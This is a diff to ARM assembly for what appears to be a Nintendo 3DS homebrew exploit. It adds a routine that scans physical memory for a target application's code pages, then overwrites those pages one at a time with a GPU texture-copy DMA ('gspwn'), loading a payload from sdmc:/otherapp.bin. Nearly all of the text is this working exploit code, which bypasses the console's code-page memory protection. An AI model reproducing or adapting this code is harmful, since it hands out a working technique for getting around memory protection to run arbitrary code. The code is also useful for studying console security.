@@ -6,7 +6,7 @@
 _start:
 /* Initialize stack. */
     mov  sp, #0x10000000
-    sub  sp, #0x2C
+    sub  sp, #0x2C + 4*12
     bl   framebuffer_reset
 /* Red screen. */
     ldr  r0, =0xFF0000FF
@@ -17,6 +17,9 @@ _start:
     strb r1, [r0, #0x77]
     ldr  r0, [r0, #0x2C]
     svc  0x18
+/* Scan where the code-pages reside in physical memory. */
+    add  r0, sp, #0x2C
+    bl   scan_code_pages
 /* Open otherapp.bin on sdcard root. */
     add  r0, sp, #0xC     // file_handle_out
     adr  r1, otherapp_str // path
@@ -35,14 +38,22 @@ _start:
     ldr  r4, =FS_READ_FILE
     blx  r4
 /* Gspwn it to code segment. */
-    ldr  r0, =PA_TO_GPU_ADDR(OTHERAPP_CODE_PA) // dst
+    mov  r4, #0
+gspwn_loop:
+    add  r0, sp, r4, lsl #2
+    ldr  r0, [r0, #0x2C]    // dst
     ldr  r1, =OTHERAPP_ADDR // src
-    ldr  r2, =OTHERAPP_SIZE // size
+    add  r1, r1, r4, lsl #12
+    ldr  r2, =0x1000        // size
     bl   gsp_gxcmd_texturecopy
     bl   small_sleep
+    add  r4, #1
+    cmp  r4, #12
+    bne  gspwn_loop
 /* Green screen. */
     ldr  r0, =0x00FF00FF
     bl   framebuffer_fill
+
 /* Grab GSP handle for next payload. */
     ldr  r0, =GSP_GET_HANDLE
     blx  r0
@@ -70,7 +81,52 @@ forever:
 otherapp_str:
     .string16 "sdmc:/otherapp.bin\0"
 
-/* memcpy32: Copy r2 bytes from r1 to r0, 32 bits at a time. */
+/* Scan heap until we find where the code ended up in physical memory. */
+scan_code_pages:
+    push {r4, r5, r6, r7, r8, lr}
+    mov  r8, r0
+    mov  r4, #0
+    ldr  r5, =CODE_SCAN_START // src
+    ldr  r6, =CODE_SCAN_BUF   // dst
+__scan_loop:
+    mov  r0, r6      // dst
+    mov  r1, r5      // src
+    ldr  r2, =0x1000 // size
+    bl   gsp_gxcmd_texturecopy
+    bl   small_sleep
+
+/* Try to see if first 0x100 bytes of the page matches any of the code pages
+   that we're interested in. */
+    mov  r7, #0
+__scan_inner_loop:
+    ldr  r0, =OTHERAPP_CODE_VA
+    add  r0, r0, r7, lsl #12
+    mov  r1, r6
+    mov  r2, #0x100
+    bl   memcmp32
+    cmp  r0, #0
+    bne  __scan_inner_loop_next
+/* We found the page! Set bit and store the addr. */
+    add  r0, r8, r7, lsl #2
+    str  r5, [r0]
+    mov  r0, #1
+    orr  r4, r4, r0, lsl r7
+__scan_inner_loop_next:
+    add  r7, #1
+    cmp  r7, #12
+    bne  __scan_inner_loop
+
+    add  r5, #0x1000 // src += 0x1000
+    add  r6, #0x100  // dst += 0x100
+
+/* Have we found all 12 pages? */
+    ldr  r0, =0xFFF
+    cmp  r4, r0
+    bne  __scan_loop
+
+    pop  {r4, r5, r6, r7, r8, pc}
+.pool
+
 memcpy32:
     cmp  r2, #0
     bxeq lr
@@ -79,16 +135,31 @@ memcpy32:
     sub  r2, #4
     b    memcpy32
 
+memcmp32:
+    mov  r3, r0
+    mov  r0, #0
+__memcmp32_loop:
+    cmp  r2, #0
+    bxeq lr
+    push {r4, r5}
+    ldr  r4, [r1], #4
+    ldr  r5, [r3], #4
+    subs r0, r4, r5
+    pop  {r4, r5}
+    bxne lr
+    sub  r2, #4
+    b    __memcmp32_loop
+
 /* small_sleep: Sleep for a while. */
 small_sleep:
-    mov  r0, #0x1000000
+    mov  r0, #0x100000
     mov  r1, #0
     svc  0x0A // svcSleepThread
     bx   lr
 
 /* gsp_gxcmd_texturecopy: Trigger GPU memcpy. */
 gsp_gxcmd_texturecopy:
-    push {lr}
+    push {r4, r5, lr}
     sub  sp, #0x20
     mov  r4, #0
 
@@ -106,7 +177,7 @@ gsp_gxcmd_texturecopy:
     mov  r0, sp
     bl   gsp_execute_gpu_cmd
     add  sp, #0x20
-    pop  {pc}
+    pop  {r4, r5, pc}
 .pool
 
 gsp_execute_gpu_cmd:
